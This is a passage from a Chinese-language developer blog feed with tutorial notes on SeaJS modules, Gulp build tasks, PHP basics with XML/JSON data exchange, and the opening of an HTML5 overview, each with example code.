代码中去加载另一个 JavaScript 代码。 SeaJS 介绍SeaJS 带来的最大好处是：提升代码的可维护性。如果一个网站的 JS 文件超过 3 个，就适合用 SeaJS 来组织和维护代码。涉及的 JS 文件越多，SeaJS 就越适合。 关于 SeaJS SeaJS 是一个适用于浏览器环境的 JavaScript 模块加载器 一个库文件，类似于 jQuery 使用这个库提供的规范的模块化的方式来编写 JavaScript 代码 只关心 JavaScript 文件代码模块如何组织 只关心 JavaScript 文件之间如何相互协议、引用、依赖 SeaJS 的作者是阿里巴巴支付宝前端架构师：玉伯 Sea.js创始人玉伯的前端开发之路 SeaJS SeaJS -github 为什么学习和使用 SeaJS ？ 简单友好的模块定义规范：SeaJS 遵循 CMD 规范，可以像 Node 一样书写模块代码 自然直观的代码组织方式：依赖的自动加载、配置简洁清晰，可以让我们更多的享受编码的乐趣 SeaJS兼容性非常好，几乎可以运行在任何浏览器引擎上 注1：SeaJS 只是实现模块化开发的一种方式或者说一种工具而已，重在模块化思想的理解 注2：因为 SeaJS 采用的 CMD 模块规范和 Node 中的 CommonJS 模块规范非常一致，所以有利于我们学习 Node 中的模块化编程 谁在用？ 淘宝网、支付宝、京东、爱奇艺。。。 SeaJS 使用场景 SeaJS 不提供任何功能性 API，只提供了解决 JavaScript 代码的命名污染和文件依赖的问题 所以 SeaJS 可以和 jQuery、underscore 等库结合使用 例如 只写写 原生 JavaScript 或者用了一些第三方库 快速上手（Getting Started） 下载 sea.js 库文件 SeaJS - Release bower install seajs npm install seajs 在页面中引入 sea.js 使用 define 函数定义模块 使用 require 函数加载模块 使用 module.exports 对外暴露接口对象 使用 seajs.use 函数启动模块系统 API 详解seajs.use 加载模块-普通路径加载模块，启动模块系统。 加载一个模块 seajs.use(&#39;id&#39;) 加载一个模块，在加载完成时，执行回调 seajs.use(&#39;id&#39;, callback) 加载多个模块，加载完成时，执行回调 seajs.use([&#39;id1&#39;,&#39;id2&#39;,...],callback) 注意： 在调用 seajs.use 之前，需要先引入 sea.js 文件 seajs.use 与 DOM ready 事件没有任何关系。如果某些操作要确保在 DOM ready 后执行，需要使用 jquery 等类库来保证 seajs.use 理论上只用于加载启动，不应该出现在 define 中的模块代码里 define(factory) define 是一个全局函数，用来定义模块。 define 接受 factory 参数，factory 可以是一个函数，也可以是一个对象或字符串。 factory 为对象、字符串时，表示模块的接口就是该对象、字符串。 factory 是一个对象 define({}) factory 是一个字符串时 define(&#39;hello&#39;) factory 是一个函数时 define(function(require, exports, module){}) require 解决依赖 相对路径：相对于当前模块来说的 require 用来加载一个 js 文件模块，相对路径：相对于当前模块来说的 require 用来获取指定模块的接口对象 module.exports。 require 在加载和执行的时候，js 会按照同步的方式和执行。 使用注意： 正确拼写 模块 factory 构造方法的第一个参数 必须 命名为 require 不要修改 不要重命名 require 函数，或在任何作用域中给 require 重新赋值 使用字符串直接量 require 的参数值 必须 是字符串直接量 模块标识模块标识是一个字符串，用来标识模块。 模块标识可以不包含文件后缀名，比如 .js seajs 推荐不加 .js 文件模块后缀 模块标识可以是 相对 或 顶级 标识 相对标识 相对标识以 . 开头，永远相对于当前模块所处的路径来解析。 顶级标识 顶级标识不以 . 或 /开始，会相对模块系统的基础路径（base路径，默认是 sea.js 文件所属的路径）。可以手动配置 base 路径。 123seajs.config(&#123; base: './js';&#125;) 普通路径（相对于 html 路径来说的）除了相对和顶级标识之外的标识都是普通路径。普通路径的解析规则，会相对当前页面解析。 123456789101112// 假设当前页面是 http://example.com/path/to/page/index.html// 绝对路径是普通路径：require.resolve('http://cdn.com/js/a');// =&gt; http://cdn.com/js/a.js// 根路径是普通路径：require.resolve('/js/b');// =&gt; http://example.com/js/b.js// use 中的相对路径始终是普通路径：seajs.use('./c'); // =&gt; 加载的是 http://example.com/path/to/page/c.jsseajs.use('../d'); // =&gt; 加载的是 http://example.com/path/to/d.js Tips: 顶级标识始终相对 base 基础路径解析。 如果不设置，base 路径默认就是 sea.js 库文件所属的路径 可以通过 seajs.config({ base: &#39;基础路径&#39; }) 来配置基础路径 绝对路径和根路径始终相对当前页面解析。 相对标识永远相对于当前文件 seajs.use 中的相对路径始终相对当前页面来解析。 modulemodule 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 module.id 模块的唯一标识，可以通过 define 方法的第一个参数来指定，默认为该模块文件的绝对路径 module.uri 模块的绝对路径 module.dependencies dependencies 是一个数组，表示当前模块的依赖 module.exports 当前模块对外提供的接口对象 相当于每个模块内部最终都执行了这么一句话：return module.exports 模块与模块之间的通信接口 exportsexports 仅仅是 module.exports 的一个引用。也就是说修改了 exports 就相当于修改了 module.exports。 但是一旦在 factory 内部给 exports 重新赋值，并不会改变 module.exports 的值。因此给 exports 赋值是无效的。 return 也是暴露，等于 module.exports 例如 jQuery 模块化 12345678910// support seajsif ( typeof define === "function" &amp;&amp; define.cmd ) &#123; define( function () &#123; return jQuery; &#125; );&#125;// orif ( typeof define === "function" &amp;&amp; define.cmd ) &#123; define( function (require, exports, module) &#123; module.exports = jQuery; &#125;);&#125; jQuery 插件包装成模块 12345678910(function(factory)&#123; if(typeof define === 'function' &amp;&amp; define.cmd) &#123; define(function(require)&#123; var $ = require('jquery'); factory($); &#125;); &#125;&#125;)(function($)&#123; // jQuery 的插件代码&#125;) exports 和 module.exports 的区别 每个模块内部对外到处的接口对象始终都是 module.exports 可以通过修改 module.exports 或给它赋值改变模块接口对象 exports 是 module.exports 的一个引用，就好比在每一个模块定义最开始的地方写了这么一句代码：var exports = module.exports分析下面代码： 1234567891011var module = &#123; exports: &#123;&#125;&#125;function changeExports (exports, module) &#123; // var exports = module.exports exports.foo = 'bar' // 这里赋值拿不到，不要使用使用 // exports = function () &#123;&#125; return module.exports&#125;changeExports(module.exports, module) 如何将一个普通的模块文件改造为兼容 CMD 规范的模块123456if (typeof define === "function" &amp;&amp; define.cmd) &#123; // 有 Sea.js 等 CMD 模块加载器存在 define(function (require, exports, module) &#123; // 使用 module.exports 向外暴露接口对象 &#125;)&#125; 高级配置 seajs.config(options)可以对 Sea.js 进行配置，让模块编写、开发调试更方便。 1234567891011121314seajs.config(&#123; // 别名配置 alias: &#123; 'es5-safe': 'gallery/es5-safe/0.9.3/es5-safe', 'json': 'gallery/json/1.0.2/json', 'jquery': 'jquery/jquery/1.10.1/jquery' &#125;, // 路径配置 paths: &#123; 'gallery': 'https://a.alipayobjects.com/gallery' &#125;, // Sea.js 的基础路径 base: 'http://example.com/path/to/base/',&#125;); 使用 SeaJS 开发计算器案例 index.html 123456789101112131415161718192021222324252627282930313233&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;SeaJS - 计算器案例&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;input type="text" id="x"&gt; &lt;select name="" id="opt"&gt; &lt;option value="0"&gt;+&lt;/option&gt; &lt;option value="1"&gt;-&lt;/option&gt; &lt;option value="2"&gt;*&lt;/option&gt; &lt;option value="3"&gt;/&lt;/option&gt; &lt;/select&gt; &lt;input type="text" id="y"&gt; &lt;button id="cal"&gt;=&lt;/button&gt; &lt;input type="text" id="result"&gt; &lt;!-- 模块系统： 1. 定义模块成员 2. 设定交互规则 0. 引包 1. 使用 define 定义一个模块，所有代码写到 define 回调函数中 2. 使用 module.exports 作为模块与模块之间的通信接口对象 3. 使用 requrie 函数加载模块，执行模块中的代码，得到模块中的 module.exports 接口对象 4. 使用 seajs.use 方法，启动模块系统，类似于电脑开机 --&gt; &lt;script src="../node_modules/seajs/dist/sea.js"&gt;&lt;/script&gt; &lt;script&gt; seajs.use('./js/main') &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; main.js 文件 12345678910111213141516171819202122232425262728293031define(function (require, exports, module) &#123; var $ = require('../../node_modules/jquery/dist/jquery'); // 如果想要拿到 jQuery 接口对象，那么 jquery.js 文件内部必须显示的通过 moudle.exports 向外暴露 var cal = require('./cal/index'); var oX = document.querySelector('#x'); var oOpt = document.querySelector('#opt'); var oY = document.querySelector('#y'); var oResult = document.querySelector('#result'); var oCal = document.querySelector('#cal'); oCal.addEventListener('click', function (e) &#123; var opt = oOpt.value; var result = 0; var x = oX.value; var y = oY.value; switch (opt) &#123; case '0': result = cal.add(x, y); break; case '1': result = cal.sub(x, y); break; case '2': result = cal.multiply(x, y); break; case '3': result = cal.divide(x, y); break; &#125; oResult.value = result; &#125;);&#125;); index.js 123456789101112/** * 每个文件模块中默认对外的接口对象就是 module.exports * 同时 SeaJS 还提供了一个接口对象 exports * 注意：exports 是 module.exports 接口对象的一个引用 * 也就是说：修改了 exports 相当于修改了 module.exports * 但是，如果想要向外部暴露一个单独的变量、函数等成员， * 那就必须通过给 module.exports 赋值才可以 */define(function (require, exports, module) &#123; exports.add = require('./add'); exports.sub = require('./sub');&#125;); add.js 12345define(function (require, exports, module) &#123; module.exports = function (x, y) &#123; return parseFloat(x) + parseFloat(y); &#125;&#125;); sub.js 12345define(function (require, exports, module) &#123; module.exports = function (x, y) &#123; return parseFloat(x) - parseFloat(y); &#125;&#125;);]]></content>
      <categories>
        <category>JS系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>模块化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gulp 构建工具]]></title>
    <url>%2F2016%2F02%2F18%2FGulp%20%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[项目构建是指项目上线之前对项目源代码进行一系列处理，使其以最佳的形式运行于线上服务器。常见处理任包括以下几方面： 1、模块化开发可以实现功能的复用并解决模块间的依赖关系，但带来好处的同时也使得功能代码的碎片化（若干文件）程度增加。 2、使用less、sass等预处理器，可以降低CSS的维护成本，最终需要将这些预处理器编译成css文件； 3、对静态资源（css、js、html、images）压缩合并可以提升网页打开速度，提高性能； 以上任务完如果完全靠手动来完成是非常耗时耗力的且容易出错，实际开发通常借助构建工具来实现。 所谓构建工具是指通过一系简单配置就可以帮我们实现合并、压缩、校验、预处理等一系列任务的软件工具。 常见的构建工具包括：Grunt、Gulp、F.I.S（百度出品）、webpack等。 Gulp是基于 Nodejs 开发的一个构建工具，借助 gulp 插件可以实现不同的构建任务，其以简洁的配置和卓越的性能成为目前主流的构建工具。 全局安装 1$ npm install -g gulp Gulp基础 1、本地安装 gulp 进入项目根目录执行 1$ npm install gulp --save-dev 2、全局安装 1$ npm install -g gulp 添加–save-dev会在package.json记录依赖关系. 3、任务清单 在项目根目录中创建 gulpfile.js，gulp会参考这个配置文件执行构建任务。 4、定义任务 在 gulpfile.js定义构建任务，如压缩、合并等。 gulp 是通过调用插件来完成具体构建任务的，并且这些插件也都基于 Nodejs. 以编译 LESS 为例，安装 1$ npm install gulp-less 使用 gulp, 定义了一个名称为 less 的任务，用来完成 less 编译成 css 的任务。 12345678910111213var gulp = require('gulp');var less = require('gulp-less');// 定义任务 参数[名称，回调函数]gulp.task('less', function()&#123; // 获取想要转换的路径，相对路径 // 用来找到要构建的资源 参数[资源路径] gulp.src('./public/less/*.less') // 将资源传给插件 参数[插件调用] .pipe(less()) // 存放路径 将构建的好的资源重新存储 参数[路径] .pipe(gulp.dest('./release/css')); ;&#125;); 5、执行任务 打开命令行窗口并切换到项目根目录下，执行命令 gulp less，这时全局安装的 gulp 便以我们定义好的 gulpfile.js 执行构建任务了。 这样LESS文件便会编译成CSS文件，并保存在了./public/css目录下。 各种插件的使用： Gulp工作原理通过不同的插件实现构建任务，Gulp只是按着配置文件调用执行了这些插件。 Gulp API Gulp是基于NodeJS的，通过require可以引入一个NodeJS的包（模块），其作用类似于浏览器中的script标签引入资源，被引入的包存放在node_modules目录下。 引入gulp包（模块）后返回一个对象（习惯赋值给变量gulp），通过该对象提供的方法（API）完成任务的配置。 1、gulp.task() 定义各种不同的任务，不同任务间存在依赖关系时，可以指定依赖。 2、gulp.src() 需要构建资源的路径，字符串或数组（可以正则方式书写） 2、gulp.pipe() 管道，将需要构建的资源“输送”给插件。 3、gulp.dest() 构建任务完成后资源存放的路径（会自动创建） 4、gulp.watch() 通过监视某静态资源的修改，然后可以调用相应任务。 常用Gulp插件 gulp-less 编译LESS文件 gulp-autoprefixer 添加CSS私有前缀 gulp-cssmin 压缩CSS gulp-rname 重命名 gulp-imagemin 图片压缩 gulp-uglify 压缩Javascript gulp-concat 合并 gulp-htmlmin 压缩HTML gulp-rev 添加版本号 gulp-rev-collector 内容替换 gulp-useref gulp-if gulp-seajs-transport 例子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125// 引包// 在 node-modules 下找var gulp = require('gulp'), // 删除文件的 clean = require('gulp-clean'), // 添加 idleading transport = require('gulp-seajs-transport'), concat = require('gulp-seajs-concat'), less = require('gulp-less'), cssmin = require('gulp-cssmin'), autoprefixer = require('gulp-autoprefixer'), imagemin = require('gulp-imagemin'), uglify = require('gulp-uglify'), concat = require('gulp-concat'), htmlmin = require('gulp-htmlmin'), rev = require('gulp-rev'), revCollector = require('gulp-rev-collector'), useref = require('gulp-useref'), gulpif = require('gulp-if'), rename = require('gulp-rename'), base64 = require('gulp-base64');gulp.task('clean', function() &#123; // 路径相对于 gulpfile，跟 node 没关系 return gulp.src('./public/dist') .pipe(clean());&#125;); // 添加 idleadinggulp.task('transport', ['clean'], function() &#123; gulp.src('./public/!(libs)/**/*.js') .pipe(transport(&#123; idleading: './public/dist/' &#125;)) .pipe(concat()) .pipe(uglify()) .pipe(gulp.dest('./public/dist'))&#125;);// css 任务gulp.task('less2css', function()&#123; return gulp.src('./public/less/*.less') .pipe(less()) .pipe(cssmin()) // 处理 CSS 中的图片为 base64 .pipe(base64()) .pipe(autoprefixer()) // 资源后缀改了，文件里的路径也需要改变，利用 gulp-rev-collector // 先改名并存储，然后再替换 .pipe(rev()) .pipe(gulp.dest('./release/css')) .pipe(rev.manifest()) .pipe(rename('css-mainfest.json')) // 收集替换前后的关系 .pipe(gulp.dest('./release/rev'));&#125;);// 图片任务// 构建过程中需要保证图片路是不变的// src 有第二个参数，是一个对象// 在 images 下面还有目录，那么这样还有问题// 在加一个*，表示有多少层目录，都给我能找到gulp.task('image', function()&#123; return gulp.src(['./images/**/*', './uploads/**/*'], &#123;base: './'&#125;) .pipe(imagemin()) .pipe(rev()) .pipe(gulp.dest('./release')) .pipe(rev.manifest()) .pipe(rename('image-mainfest.json')) .pipe(gulp.dest('./release/images'));&#125;);// js 资源gulp.task('js', function()&#123; gulp.src('./libs/*.js') .pipe(uglify()) // 合并，需要传参数，合并后的名称 .pipe(concat('all.js')) .pipe(gulp.dest('./release/libs'));&#125;);// html 资源gulp.task('html', function()&#123; gulp.src('./view/*.html') // 需要参数，去掉空间，注释，压缩 js 代码 .pipe(htmlmin(&#123; collapseWhitespace:true, removeComments:true, minifyJs: true &#125;)) .pipe(gulp.dest('./release/views'));&#125;);// 替换任务gulp.task('revCollector', function()&#123; // 按照哪个标准去替换 两个参数 // 文件 // 替换哪个文件 gulp.src(['./release/rev/*.json', './release/*.html']) .pipe(revCollector()) .pipe(gulp.dest('./release'));&#125;);// 页面中还引入了 jQuery，想要让两个文件做一个合并，前面的 gulp-concat 插件有点问题，还需要我们手动修改路径。// 压缩合并处理路径任务，md5gulp.task('useref', function()&#123; return gulp.src('./index.html') // 找到 build 标记的内容，合并并替换 .pipe(useref()) // 假如是以 js 结尾的，合并并压缩，那么再调用下一个插件 // uglify 只能压缩 js 文件，使用 gulp-if 插件过滤 js 文件 .pipe(gulpif('*.js', uglify())) // 静态资源改名字 .pipe(gulpif('*.js', rev())) .pipe(gulp.dest('./release')) // 做一个收集，合并前后的文件名称变化 .pipe(rev.manifest()) // 为了避免替换 .pipe(rename('js-manifest.json')) .pipe(gulp.dest('./release/rev'));&#125;);// 其它内容gulp.task('other', function() &#123; gulp.src(['./api/*', './public/font/*'], &#123;base: './'&#125;) .pipe(gulp.dest('./release'));&#125;);// 路径替换gulp.task('rev', ['css', 'image', 'useref'], function () &#123; gulp.src(['./release/rev/*.json', './release/**/*.?(html|css)']) .pipe(revCollector()) .pipe(gulp.dest('./release'));&#125;);gulp.task('default', ['rev', 'other', 'html']); seajs 的配置文件中加 vars 键修改引入 seajs 文件的路径 123456789seajs.config(&#123; base: './public/asserts', alias: &#123; 'jquery': 'jQuery/jquery' &#125;, vars: &#123; path: 'dist' &#125;&#125;); 重新配置生产环境（项目上线）文件路径： 1234&lt;script&gt; // ./public/&#123;path&#125;/scripts/index 这个路径是模块名称需要的 seajs.use('./public/&#123;path&#125;/index');&lt;/script&gt; bulid 的一个示例 123456789101112131415161718192021222324252627&lt;!-- build:js ./libs/all.js --&gt;&lt;script src="./libs/jquery.min.js"&gt;&lt;/script&gt;&lt;script src="./libs/toggle.js"&gt;&lt;/script&gt;&lt;!-- endbuild --&gt;``` ## 缓存、性能优化`&lt;link href="base.css?v=1"&gt;`后面的参数用来解决浏览器缓存浏览器会将静态资源（CSS、images、js）缓存到本地浏览器中，下次请求时就读取本地资源来显示，缓存可以带来性能的提升，但是也会给前端开发者带来问题。往往这种问题是由缓存构成的。怎么解决呢？分析浏览器缓存机制问题。什么情况下不需要浏览器缓存？浏览器默认缓存按资源路径进行的缓存 ./css/base.css，因此每次开发加个参数 ./css/base.css?v=1 或者 ./css/base.css?v=20141123 加了一个时间戳；前端性能优化：`协商缓存，雅虎 13 条`当内容的确改变后才需要，就意味着我们需要知道内容是否改变了，利用 md5 可以处理。当更改后会形成新的值，利用这个值充当文件名称。把文件加密成 md5 串，这种方式就是指纹## 不同 js 文件合并需要注释:` ./libs/all.js `就是合并之后的名称```js&lt;!-- build:js ./libs/all.js --&gt;&lt;script src='./libs/jquery.min.js'&gt;&lt;/script&gt;&lt;script src='./libs/toggle.js'&gt;&lt;/script&gt;&lt;!-- endbuild --&gt; 移除一些上线不需要的文件。 12345678910&lt;!-- 并没有实际合并，而是利用 build:css 来改名称 --&gt;&lt;!-- build:css ./public/css/main.css --&gt;&lt;link rel="stylesheet" href="./public/less/main.less"&gt;&lt;!-- endbuild --&gt;&lt;!-- build:remove --&gt;&lt;script src="./public/less/less.js"&gt;&lt;/script&gt;&lt;!-- endbuild --&gt;&lt;!-- build:remove --&gt;&lt;script src='./libs/less.js'&gt;&lt;/script&gt;&lt;!-- endbuild --&gt; 合并之后压缩.pipe(gulpif(&#39;*.js&#39;, uglify())) gulp 构建过程总结 touch gulpfile.js 全局安装 gulp 本地安装 gulp 处理 css gulp-less gulp-cssmin gulp-autoprefixer gulp-rev rev.minifest() 改名称了 gulp-rename 图片处理 gulp-imagemin gulp-rename 改名 gulp-useref gulp-manifest gulp-uglify gulp-if 路径替换 gulp-rev-collector 压缩 html gulp-htmlmin 处理一些其它内容 监视文件变化12345gulp.task('watch', function()&#123; // 可以用这个 watch 来实现实时编译的功能 gulp.watch('./index.html',['default'], function(event)&#123; &#125;);&#125;); 文件合并时需要对每一个模块娶一个名字需要一个工具 seajs 在上线做合并处理的时候，并不是将所有文件合并才是最佳方式，有一些公共第三方模块可以不做合并处理，利用浏览器缓存功能更会使得性能更好； define(‘当前模块路径’, [‘依赖模块相对路径’], function() {}); 要实现上述操作，需要在合并前]]></content>
      <categories>
        <category>Gulp构建工具系列</category>
      </categories>
      <tags>
        <tag>Gulp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP-基础]]></title>
    <url>%2F2016%2F02%2F08%2FPHP-%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[php基础文件以.php后缀结尾，所有程序包含在 &lt;?php ** 这里是代码 ** ?&gt; 避免使用中文目录和中文文件名，php页面无法直接打开需要运行在服务器环境当中。 配置 php 文件，访问 https 加密网站如何找到配置文件： 在后缀名 .php 的文件中加上： phpinfo(); exit; 浏览器下访问：.php 后缀的文件 找到：Loaded Configuration File的路径，php.ini 找到 openssl，把 ‘;’ 去掉就可以访问 https 简单的php程序123456&lt;?php // 用来指定编码集 header('Content-Type:text/html; charset=utf-8'); /*这是一个最简单的php程序*/ echo 'hello world!';?&gt; JSONP 原理：浏览器的 XMLHTTPRequest 有域的限制，img 的 src，link 的 href 和 script 的 src 没有域的限制，浏览器的安全机制。 在传统里没有标准的技术，利用了技术上的特性绕过了安全性的限制，就巧妙的使用 script ，就会得到请求资源返回的内容。 12&lt;script src="xx.php?callback=fn"&gt;&lt;/script&gt;&lt;!-- 相当于返回了 fn()，变向的实现了跨域 --&gt; JSONP 突破了域的限制，没有突破安全限制。不能实现 post 跨域。跨域 JSONP 是主流。 变量 变量以$开头 字母/数字/下划线 不能以数字开头 大小写敏感（区分大小写） (1)、声明一个变量$a并赋值为10 1$a = 10; (2)、输出一个变量$a 1echo $a; (3)、声明一个变量$b并赋值为10 1$b = 10; (4)、输出一个变量$b 1echo $b; 输出顺序是自上向下的，相当于js dcoument.write() 。 数据类型字符型 1$str = 'hello world!'; 整型 1$num = 10; 浮点型 1$float = 10.5; 布尔型 1$bool = true; 数组 JavaScript 数组定义方式 var arr = [1, 2, 3]。arr[0]、arr[1]、arr[1] 等； PHP 是这样定义数组的 12345678910$arr = array(1, 2, 3); // 这种方式叫做**索引数组**// echo $arr[0];// echo $arr[2];// 定义方式和Javascript有区别，但是访问方式是一样的// var obj = &#123;name: Hiraku, age: 10&#125;// PHP另一种定定数组的方式，所表达的意义和Javascript一样，// 只是语法格式不一样// 这种方式叫做**关联数组**$arr1 = array('name'=&gt;'Hiraku', 'age'=&gt;10);// echo $arr1['name']; 对象 12345678910// Javascript var obj = &#123;name: Hirkau, age: 10&#125;// PHP需要先创建一个类，下面就是创建过程class Person &#123; public $name = 'Hiraku'; public $age = 10;&#125;$person = new Person;// PHP访问一个对象属性的语法是不一样的echo $person-&gt;name;// obj['name']; obj.name 不行 NULL PHP 中一种特殊的数据类型，表示空值，即表示没有为该变量设置任何值 null (空值)不区分大小写，null 和 NULL 是一样的。 单引号&amp;双引号区别： 单引号内部的变量不会执行双引号会执行 1234$name = '小明';echo 'name is $name'; //输出 name is $nameecho '&lt;br&gt;';echo "name is $name"; //输出 name is 小明 索引数组、关联数组 运算符&amp;内容输出运算符基本与Javascript语法一致，.号表示字符串拼接符，JavaScript中为 + 号 内容输出 echo：输出简单数据类型，如字符串、数值 print_r()：输出复杂数据类型，如数组 var_dump()：输出详细信息，如对象、数组（了解） 函数12345//函数名对大小写不敏感 默认参数（了解即可）function sayHello($name='web developer') &#123; echo $name . '你好!';&#125;sayHello(); 分支，循环语句1234567891011121314151617181920212223/** * 分支控制语句、循环语句 与Javascript一样 * foreach 数组遍历函数，类似Javascript中的 for in */$name = 'Hiraku';if($name == 'Hiraku') &#123; echo '我已经在' . $name . '学习';&#125; else &#123; echo '我还没有学习过编程';&#125;$arr = array('Hiraku', '今年', '10岁了');// 索引数组 $length = count($arr);// PHP函数，计算数组的长度for($i=0; $i&lt;$length; $i++) &#123; // 和Javascript是一样的 echo $arr[$i];&#125;foreach($arr as $k=&gt;$v) &#123; echo $k . '~~~' . $v;&#125;;$arr1 = array('name'=&gt;'Hiraku', 'age'=&gt;'10');// 关联数组echo $arr1[0];// 验证关联数组不可以按索引下标来访问foreach($arr1 as $key=&gt;$val) &#123;//PHP遍历一个关联数组 echo $key . '~~~' . $val;&#125;// 实际开发都是用foreach来遍历数组的 表单处理 表单 name 属性的是用来提供给服务端接收所传递数据而设置的 表单 action 属性设置接收数据的处理程序 表单 method 属性设置发送数据的方式 当上传文件是需要设置 enctype=&quot;multipart/form-data&quot;，且只能 post 方式!!!! $_GET接收 get 传值 $_POST接收 post 传值 $_FILES 接收文件上传 文件导入&amp;&amp;常用php函数12include '07.form.html'; // 第一种方法require '07.form.php'; // 第二种方法 12345678910$array = array( 'username'=&gt;'Hirkau', 'password'=&gt;'123456');echo '获取数组的长度：'.count($array);echo '&lt;br&gt;';echo '判断是否在数组中：'.in_array('Hirkau',$array);echo '&lt;br&gt;';echo '检测数组中是否存在key：'.array_key_exists('username',$array);echo '&lt;br&gt;'; 数据描述和例子 必须有一个根元素 不可有空格、不可以数字或.开头、大小写敏感 不可交叉嵌套 属性双引号（浏览器自动修正成双引号了） 注释和HTML一样 虽然可以描述和传输复杂数据，但是其解析过于复杂并且体积较大，所以实现开发已经很少使用了。 xml 文件123456789101112131415&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;root&gt; &lt;arrayList&gt; &lt;array&gt; &lt;src&gt;images/banner.jpg&lt;/src&gt; &lt;newPirce&gt;12.00&lt;/newPirce&gt; &lt;oldPrice&gt;30.00&lt;/oldPrice&gt; &lt;/array&gt; &lt;array&gt; &lt;src&gt;images/banner.jpg&lt;/src&gt; &lt;newPirce&gt;12.00&lt;/newPirce&gt; &lt;oldPrice&gt;30.00&lt;/oldPrice&gt; &lt;/array&gt; &lt;/arrayList&gt;&lt;/root&gt; php 文件12345678&lt;?php header('Content-Type:text/xml;charset=utf-8'); /*以xml格式传输数据的时候要求响应内容格式是 text/xml*/ /*file_get_contents 获取文件内容*/ $xml = file_get_contents('01.xml'); /*输出xml内容*/ echo $xml;?&gt; ajax 请求1234567891011var xhr = new XMLHttpRequest;xhr.open('get','01.php');xhr.send(null);xhr.onreadystatechange = function()&#123; if(xhr.status == 200 &amp;&amp; xhr.readyState == 4)&#123; /*获取到XML格式内容 放回的是DOM对象 document*/ var xml = xhr.responseXML; /*通过选着器可以获取到xml的数据*/ console.log(xml.querySelectorAll('array')[0].querySelector('src').innerHTML); &#125;&#125; JSON即JavaScript Object Notation，另一种轻量级的文本数据交换格式，独立于语言。 数据在名称/值对中 数据由逗号分隔(最后一个健/值对不能带逗号) 花括号保存对象方括号保存数组 使用双引号 1234[ &#123;"src":"images/detail01.jpg","oldPrice":"10.12","newPrice":"130.00"&#125;, &#123;"src":"images/detail02.jpg","oldPrice":"1.00","newPrice":"11.00"&#125;,] JSON数据在不同语言进行传输时，类型为字符串，不同的语言各自也都对应有解析方法，需要解析完成后才能读取； 1、PHP解析方法 json_encode()、json_decode() 1234567891011121314151617181920212223&lt;?php header('Content-Type:text/html;charset=utf-8'); /*以json格式传输数据的时候要求响应内容格式是 application/json*/ /*注意也可以不设置 但是这遵循的一个规范*/ /*file_get_contents 获取文件内容*/ $json = file_get_contents('01.json'); /*输出json内容*/ echo $json; echo '&lt;br&gt;&lt;br&gt;'; $array = array( array('src'=&gt;'images/detail01.jpg','newPrice'=&gt;'12.00','oldPrice'=&gt;'455.00'), array('src'=&gt;'images/detail02.jpg','newPrice'=&gt;'65.00','oldPrice'=&gt;'878.00'), array( 'src'=&gt;'images/detail01.jpg','newPrice'=&gt;'100.00','oldPrice'=&gt;'1000.00') ); /*将php数组转化成json字符*/ $json_array = json_encode($array); echo $json_array; echo '&lt;br&gt;&lt;br&gt;'; /*将json字符转化成php数组*/ $array_json = json_decode($json_array); echo $array_json; echo '&lt;br&gt;&lt;br&gt;';?&gt; 2、Javascript 解析方法 JSON对象 JSON.parse()、JSON.stringify()； JSON兼容处理json2.js 总结：JSON体积小、解析方便且高效，在实际开发成为首选。 123456789101112131415var xhr = new XMLHttpRequest;xhr.open('get','01.php');xhr.send(null);xhr.onreadystatechange = function()&#123; if(xhr.status == 200 &amp;&amp; xhr.readyState == 4)&#123; /*获取仅仅是字符串*/ var text = xhr.responseText; /*需要把字符串转化成JSON对象*/ var json_obj = JSON.parse(text); console.log(json_obj); /*我们也可以把JSON对象转化成字符串*/ var json_str = JSON.stringify(json_obj); console.log(json_str); &#125;&#125;]]></content>
      <categories>
        <category>PHP系列</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5知识体系]]></title>
    <url>%2F2016%2F01%2F18%2FHTML5%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[简介、h5语义化标签、经典布局123&lt;!--[if lt IE 9]&gt;&lt;script src="js/html5shiv.min.js"&gt;&lt;/script&gt;&lt;![endif]--&gt; html骨架 经典网页布局 语义化标签 header、nav、main、session、article、aside、figure、footer、mark、progress、hgroup(已废弃)、time、details、bdi、command、summary、rp、rt、ruby 兼容h5标签的插件 html5shiv.min.js 表单 表单类型 text password radio checkbox button submit reset image file hidden email color url number 、search、range 、tel、time、date、datetime、week、month、datetime-local 表单元素 表单属性 placeholder 占位符 autofocus 获取焦点 multiple 文件上传多选或多个邮箱地址 autocomplete 自动完成，用于form元素，也可用于部分input，默认值on form 指定表单项属于哪个form，处理复杂表单时会需要 novalidate 关闭验证，可用于 标签，（只适应用form） required 验证条件，必填项 pattern 正则表达式 自定义验证规则 表单事件 inp.oninput，内容改变时触发 表单元素 注意 datalist 的使用表单元素 123456789&lt;datalist&gt; &lt;input type="text" list="hobby" name="hobby"&gt; &lt;datalist id="hobby"&gt; &lt;option value="basketball"&gt;&lt;/option&gt; &lt;option value="basketball"&gt;&lt;/option&gt; &lt;option value="football"&gt;&lt;/option&gt; &lt;option value="pingpang"&gt;&lt;/option&gt;&lt;/datalist&gt;&lt;keygen name="security"&gt;&lt;/keygen&gt;加密类型 表单属性 autofocus placeholder multiple autocomplete 媒体audio标签三种媒体格式 controls autoplay 两个属性 三种媒体格式 mp3 ogg wav video标签三种媒体格式 controls autoplay 两个属性 三种媒体格式 mp4 ogg webm DOM扩展获取元素 document.getElementsByClassName (&#39;class&#39;) 通过类名获取元素，以类数组形式存在。 document.querySelector(&#39;selector&#39;) 通过CSS选择器获取元素，符合匹配条件的第1个元素。 document.querySelectorAll(&#39;selector&#39;) 通过CSS选择器获取元素，以类数组形式存在。 css当中可用的 在querySelector中都能用 querySelector querySelectorAll类名操作(比较方便) this.classList !当前元素的class! 